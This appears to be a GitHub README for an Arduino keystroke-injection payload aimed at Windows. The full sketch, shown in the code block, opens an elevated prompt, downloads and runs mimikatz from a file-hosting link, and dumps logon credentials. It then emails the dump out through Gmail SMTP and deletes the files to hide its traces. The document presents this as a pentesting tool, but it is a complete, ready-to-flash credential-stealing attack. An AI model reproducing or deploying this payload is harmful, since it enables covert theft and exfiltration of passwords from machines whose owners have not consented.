# Arduino mimikatz hash dump payload and report via email. Optimised for windows 10
## Runs mimikatz locally from a portable arduino and emails you the report. The Budget Rubber Ducky.

mimikatz dumps the NTLM password hashes, system information and more, very useful for pentesting.

Tested on windows 10, 8, 7, *Vista* on both x64 and x86.

This script is optimised to run off portable arduino's such as the Arduino Pro Micro (really cheap at $3) but will also work on others. The script's size at only 6,812 bytes is perfect for small flash memory units.


#### Script run time: 5-10 seconds on an Arduino Pro Micro using the Arduino Leonardo chip
<img src="https://github.com/valkyrix/Arduino-mimikatz-dump-and-report-via-email-for-windows-10/raw/master/pro_micro.jpg" align="middle" height="600" width="600" >

Mimicats binaries have been hardcoded but they can be changed by replacing the two url's within the powershell command.

The script has been setup to communicate with the gmail smtp server but can be used with any email provider really.

Replace `EMAIL` and `PASSWORD` placeholders with your own.
Change the SMTP server and port information if you are not using gmail as the provider.

#### Script stages

- Launch elevated command prompt.
- Download the correct mimikatz exe based on processor type.
- Execute mimikatz and export data.
- Email the output to selected email address as an attachment using powershell's SMTP .
- Remove all traces on the system.

```Arduino
#include "Keyboard.h"

void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

/* Init function */
void setup()
{
  Keyboard.begin();
  delay(500);
  Keyboard.press(KEY_LEFT_CTRL);
  delay(200);
  Keyboard.press(KEY_ESC);
  delay(200);
  Keyboard.releaseAll();
  delay(200);
  Keyboard.print("cmd.exe");
  delay(200);
  Keyboard.releaseAll();
  delay(200);
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_SHIFT);
  Keyboard.press(KEY_RETURN);
  delay(200);
  Keyboard.releaseAll();

  delay(1000);

  // Download the correct exe based on processor type
  Keyboard.print("powershell if ([System.IntPtr]::Size -eq 4) { (new-object System.Net.WebClient).DownloadFile('https://1fichier.com/?cw5v9jryul','%TEMP%\\pw.exe');  }else{ (new-object System.Net.WebClient).DownloadFile('https://1fichier.com/?13f1u3iqc3','%TEMP%\\pw.exe');}");
  typeKey(KEY_RETURN);
  delay(1500);

  // execute and export output from mimikatz
  Keyboard.print("%TEMP%\\pw.exe > C:\\pwlog.txt & type C:\\pwlog.txt;");
  typeKey(KEY_RETURN);
  delay(100);
  Keyboard.print("privilege::debug");
  typeKey(KEY_RETURN);
  Keyboard.print("sekurlsa::logonPasswords full");
  typeKey(KEY_RETURN);
  Keyboard.print("exit");
  typeKey(KEY_RETURN);
  delay(300);
  Keyboard.print("del %TEMP%\\pw.exe");
  typeKey(KEY_RETURN);
  delay(300);

  // email log via gmail
  Keyboard.print("powershell -ExecutionPolicy ByPass");
  typeKey(KEY_RETURN);
  delay(300);
  Keyboard.print("$SMTPServer = 'smtp.gmail.com'");
  typeKey(KEY_RETURN);
  Keyboard.print("$SMTPInfo = New-Object Net.Mail.SmtpClient($SMTPServer, 587)");
  typeKey(KEY_RETURN);
  Keyboard.print("$SMTPInfo.EnableSsl = $true");
  typeKey(KEY_RETURN);
  Keyboard.print("$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('EMAIL', 'PASSWORD');");
  typeKey(KEY_RETURN);
  Keyboard.print("$ReportEmail = New-Object System.Net.Mail.MailMessage");
  typeKey(KEY_RETURN);
  Keyboard.print("$ReportEmail.From = 'EMAIL'");
  typeKey(KEY_RETURN);
  Keyboard.print("$ReportEmail.To.Add('EMAIL')");
  typeKey(KEY_RETURN);
  Keyboard.print("$ReportEmail.Subject = 'Mimikatz report'");
  typeKey(KEY_RETURN);
  Keyboard.print("$ReportEmail.Body = 'script by Valkyrix.github.io'");
  typeKey(KEY_RETURN);
  Keyboard.print("$ReportEmail.Attachments.Add('C:\\pwlog.txt')");
  typeKey(KEY_RETURN);
  Keyboard.print("$SMTPInfo.Send($ReportEmail)");
  typeKey(KEY_RETURN);
  delay(7000);

  Keyboard.print("exit");

  typeKey(KEY_RETURN);

  // Cleanup and flee the scene.
  Keyboard.print("del C:\\pwlog.txt");
  typeKey(KEY_RETURN);
  delay(300);

  Keyboard.print("exit");
  typeKey(KEY_RETURN);
  Keyboard.end();
}

/* Unused endless loop */
void loop() {}
```


